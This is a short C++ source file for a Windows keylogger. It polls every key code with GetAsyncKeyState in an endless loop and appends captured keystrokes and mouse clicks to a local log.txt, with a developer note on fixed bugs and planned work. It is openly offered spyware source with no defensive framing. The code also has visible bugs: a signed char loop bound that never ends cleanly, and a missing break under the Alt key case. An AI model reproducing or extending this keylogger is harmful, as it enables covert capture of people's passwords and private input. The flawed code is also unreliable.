#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void WinLogging();

int main()
{
    WinLogging();
}

void WinLogging()
{
    while (true)
    {
        for (char c = 0; c <= 254; c++)
        {
            if (GetAsyncKeyState(c) & 0x1)
            { // comparing last bit from both using AND
                ofstream log;
                log.open("log.txt", ios::app); // stores o/p in the log file

                switch (c)
                { // for non-alphanumeric keys
                case VK_BACK:
                    log << "[backspace]";
                    break;
                case VK_RETURN:
                    log << "[enter]";
                    break;
                case VK_SHIFT:
                    log << "[shift]";
                    break;
                case VK_CONTROL:
                    log << "[control]";
                    break;
                case VK_CAPITAL:
                    log << "[cap]";
                    break;
                case VK_TAB:
                    log << "[tab]";
                    break;
                case VK_MENU:
                    log << "[alt]";
                case VK_LBUTTON:
                    log << "[LB]";
                    break;
                case VK_RBUTTON:
                    log << "RB";
                    break;
                default:
                    log << c;
                }
                // cout<<c;
            }
        }
    }
}
// Dev note: WinLogging works only for windows system,
//   bug report:                                            To Do:
//       -> double alphanumeric input [Solved]                  -> Detect Special Keys
//